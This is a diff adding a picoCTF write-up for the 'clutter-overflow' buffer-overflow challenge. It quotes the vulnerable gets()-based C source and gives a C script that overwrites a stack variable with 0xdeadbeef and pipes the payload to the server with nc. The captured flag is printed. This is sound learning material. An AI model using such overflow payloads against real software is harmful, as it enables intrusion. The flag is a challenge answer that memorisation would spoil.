@@ -277,3 +277,184 @@ where `BUFSIZE` was `#define BUFSIZE 32`
 [printf return value](https://www.geeksforgeeks.org/c/return-values-of-printf-and-scanf-in-c-cpp/)
 
 ***
+# 3. clutter-overflow
+
+>Clutter, clutter everywhere and not a byte to use.
+nc mars.picoctf.net 31890  
+
+## Solution:
+In this challenge the program will print the flag if `code == GOAL`, we can try to buffer overflow gets() and overwrite the value of `GOAL` to `code`.  
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+#define SIZE 0x100//256
+#define GOAL 0xdeadbeef//3735928559
+
+const char* HEADER =
+" ______________________________________________________________________\n"
+"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|\n"
+"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |\n"
+"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|\n"
+"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \\^ ^ |\n"
+"|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \\ ^ _ ^ / |                | \\^ ^|\n"
+"| ^/_\\^ ^ ^ /_________\\^ ^ ^ /_\\ | //  | /_\\ ^| |   ____  ____   | | ^ |\n"
+"|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|\n"
+"| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |\n"
+"|^ ^ ^ ^ ^| /     (   \\ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \\|^ ^|\n"
+".-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |\n"
+"|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\\ |^ ^|\n"
+"| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |\n"
+"|'.____'_^||/!\\@@@@@/!\\|| _'______________.'|==                    =====\n"
+"|\\|______|===============|________________|/|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
+"\" ||\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"  \n"
+"\"\"''\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
+"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
+"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"";
+
+int main(void)
+{
+  long code = 0;
+  char clutter[SIZE];
+
+  setbuf(stdout, NULL);
+  setbuf(stdin, NULL);
+  setbuf(stderr, NULL);
+
+  puts(HEADER);
+  puts("My room is so cluttered...");
+  puts("What do you see?");
+
+  gets(clutter);
+
+
+  if (code == GOAL) {
+    printf("code == 0x%llx: how did that happen??\n", GOAL);
+    puts("take a flag for your troubles");
+    system("cat flag.txt");
+  } else {
+    printf("code == 0x%llx\n", code);
+    printf("code != 0x%llx :(\n", GOAL);
+  }
+
+  return 0;
+}
+```  
+I made a C program to print a large string.  
+```c
+#include <stdio.h>
+int main() {
+  for (int i=1; i<=257; i++) {
+    printf("A");
+  }
+  return 0;
+}
+```  
+Piping it into the `chall` gives the output -  
+`lallu@VedantLohan:~/picoctf/bin/clutter$ ./script | ./chall`  
+```
+code == 0x0
+code != 0xdeadbeef :(
+```  
+so it doesn't overfl'ow for 257, we try 264 and 265, it does at 265.  
+```
+code == 0x41
+code != 0xdeadbeef :(
+```  
+We can see it overflowed and printed 0x41 which is 'A'.  
+Now we need to overflow it with `0xdeadbeef` but we have to use little endian otherwise it would be interpreted as ASCII.
+`\xef\xbe\xad\xde` should be added to the end of the input string.  
+We write the script as-  
+```c
+#include <stdio.h>
+
+int main(void) {
+  for (int i = 0; i < 264; i++) {
+        putchar('A');
+}
+  printf("\xef\xbe\xad\xde");
+  putchar(0);    /*we have to use putchar(0) because printf() will not print all the '\0's, it will stop after reading 1*/
+  putchar(0);
+  putchar(0);
+  putchar(0);
+  putchar('\n'); //gets() sees \n at the end of input
+  return 0;
+}
+```  
+sample output  
+```bash
+lallu@VedantLohan:~/picoctf/bin/clutter$ ./script | ./chall
+ ______________________________________________________________________
+|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
+| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
+|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
+| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
+|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
+| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
+|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
+| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
+|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
+.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
+|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
+| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
+|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
+|\|______|===============|________________|/|""""""""""""""""""""""""""
+" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""
+""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
+""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+My room is so cluttered...
+What do you see?
+code == 0xdeadbeef: how did that happen??
+take a flag for your troubles
+cat: flag.txt: No such file or directory
+```  
+We can see it `code` has the correct value now !  
+Now we just pipe this script to the server  
+```bash
+allu@VedantLohan:~/picoctf/bin/clutter$ ./script | nc mars.picoctf.net 31890
+ ______________________________________________________________________
+|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
+| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
+|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
+| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
+|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
+| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
+|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
+| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
+|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
+.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
+|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
+| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
+|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
+|\|______|===============|________________|/|""""""""""""""""""""""""""
+" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""
+""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
+""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+My room is so cluttered...
+What do you see?
+code == 0xdeadbeef: how did that happen??
+take a flag for your troubles
+picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
+```
+
+## Flag:
+
+```
+picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
+```
+
+## Concepts learnt:
+- setbuf() is used to control the buffering behaviour of a file stream.
+- Little-endian is a way of storing multi-byte integers in memory with least-significant byte first.
+
+## Notes:
+I was making the mistake that while trying to overflow the buffer I was copy pasting the string, but it wasnt overflowing because the terminal is in canonical mode and it enforces a maximum line length, so the paste gets truncated before the program sees it.  
+To fix it I piped the input string.  
+I didn't add '\n' in the script so it wasn't working because gets() was expecting a newline char at the end of input.  
+
+## Resources:
+[Commands pasted into terminal are truncated](https://unix.stackexchange.com/questions/92387/commands-pasted-into-terminal-are-truncated)  
+
+***
